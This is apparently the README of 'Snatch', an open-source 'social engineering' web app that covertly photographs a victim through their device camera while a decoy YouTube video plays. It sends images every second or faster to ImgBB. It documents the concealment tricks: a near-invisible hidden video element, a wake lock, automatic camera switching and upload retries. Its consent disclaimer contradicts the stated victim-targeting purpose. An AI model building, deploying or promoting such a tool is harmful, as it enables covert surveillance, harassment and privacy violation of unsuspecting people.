# Snatch

Snatch is an open-source social engineering web application that allows users to capture images using a victim's device camera and upload them to ImgBB. It is designed to work on modern mobile and desktop browsers and provides simple secretive camera switching and image capture functionality.  
Click [here](youtube-snatch.netlify.app) to preview! This is just a demo, no actual images have been captured or sent due to the missing API key. 


### Features
- Capture images from device camera
- Switch between front and back cameras (supported mobile devices)
- Upload images to ImgBB
- Works as a web app (no installation required)
- Open-source under the MIT License


### Browser Support 
Snatch works best on:
- Google Chrome (Android / Desktop)
- Microsoft Edge
- Firefox
- Safari (limited support on iOS)
- ⚠️ Camera switching behavior depends on the browser and device. Some devices may not support switching cameras in web apps


## Configuration 
Note: Camera access requires HTTPS or localhost 


### 1. Obtain Your ImgBB API Key
Snatch needs an ImgBB API key to upload images
- Create an account at https://imgbb.com
- Get your API key

### 2. Configure Your ImgBB API Key
You can set it in two ways: 

**Option A (Recommended): Using index.html Meta Tag**  
Edit `<meta name="imgbb-key" content="">` and change it to `<meta name="imgbb-key" content="YOUR_API_KEY_HERE">`  
This is read in **app.js** when the app starts

**Option B: Inside JavaScript** (Not Recommended for Public Repos)  
Edit this line in **app.js** (top section) `const DEFAULT_IMGBB_KEY = ' // Paste here ';` and change to `const DEFAULT_IMGBB_KEY = 'YOUR_API_KEY_HERE';`  
⚠️ Do NOT commit real API keys to public repositories!

### 3. Configure the Background Video
Snatch displays a YouTube video in the background. Edit in **index.html**.  
Change the iframe source `<iframe src=" <!-- Paste Here --> ">` and replace with `<iframe src="https://www.youtube.com/embed/VIDEO_ID">`  
Change fallback link `<a href=" <!-- Paste here --> ">` and replace with `<a href="https://youtube.com/watch?v=VIDEO_ID">`. This is used if the iframe fails to load.  

## Functionality
### 1. Running the App Locally
Requirements;
- Modern browser (Chrome, Edge, Firefox, Safari)
- HTTPS or localhost (camera access requires secure context). Opening **index.html** directly may block camera access.

### 2. Starting the Camera & Capture System
When the page loads: **app.js** (DOMContentLoaded section near bottom)  
The app automatically:
- Detects available cameras `(getDevices())`
- Starts the default camera `(startCamera())`
- Begins capture loop `(startCaptureLoop())`
- Enables auto-switching `(startAutoSwitch())`

### 3. Automatic Image Capture
Snatch takes pictures automatically at intervals. It:
- Captures frame `(captureFrameAsBlob())`
- Converts to Base64 `(blobToBase64())`
- Uploads to ImgBB `(uploadToImgbb())`

**Interval is controlled by:** `const captureIntervalInput`  
**Default fallback is:** 1000 ms (1 second)  
**Minimum allowed:** 200 ms  

### 4. Upload Process (ImgBB)
Upload logic is in: **app.js** - `async function uploadToImgbb()`

Process:
- Reads API key
- Creates FormData
- Sends POST request
- Retries up to 3 times
- Returns uploaded image URL

If no API key is found: `setStatus('No imgbb API key configured — skipping upload');` and uploads are skipped.

### 5. Wake Lock (Prevent Screen Sleep)
Snatch can keep the screen awake.

Implemented in: **app.js** - `async function acquireWakeLock()`

Uses: `navigator.wakeLock.request('screen')`
If enabled, the screen will not turn off during capture.

### 6. Camera Preview (Hidden Mode)
Snatch uses a hidden `<video>` element for capturing frames.

Created in: **app.js** - `preview = document.createElement('video');`

Styled to be invisible:  
`preview.style.opacity = '0';`  
`preview.style.width = '2px';`  
This allows background capture without showing UI.

### 7. Stopping the Camera
Camera stops when:
- Page closes
- Tab changes

Handled in: **app.js** - `function stopCamera()` and `window.addEventListener('beforeunload')`

## Troubleshooting
**1. Camera Not Working**  
Check:  
✔️ HTTPS or localhost  
✔️ Browser permissions  
✔️ Secure context  

Detected in: `isSecureContextAllowed()`

**2. Only Front Camera Works**  
This depends on browser support  
Handled in: `cycleCamera()`  
Fallback uses: `facingMode: 'user' / 'environment'`  
Some browsers ignore this.  

**3. Upload Not Working**  
Check:  
✔️ API key is set  
✔️ Network connection  
✔️ ImgBB service status  

## Contributing
Contributions are welcome!

To contribute:
- Fork the repository
- Create a new branch
- Make your changes
- Commit and push
- Open a Pull Request
Please ensure your code follows existing style and is well documented.

## License
This project is licensed under the MIT License.
See the LICENSE file for details.

## Disclaimer
Snatch is provided "as is", without warranty of any kind.
The author and contributors are not responsible for any damages, losses, misuse, or legal issues arising from the use of this software.
Users are solely responsible for; how they use the application, compliance with local laws and regulations, protecting user privacy, and securing API keys and data.
By using this software, you agree that the author and contributors are not liable for any claims, damages, or consequences resulting from its use.

### Privacy & Ethics Notice
This software accesses device cameras.

You must:
- Obtain user consent before capturing images
- Respect privacy and data protection laws
- Avoid using this software for surveillance, harassment, or illegal activities
- Misuse of this software is strictly discouraged.

## 📬 Contact
GitHub: https://github.com/asher-not-king  
For questions, issues, or suggestions, please open an issue on GitHub.
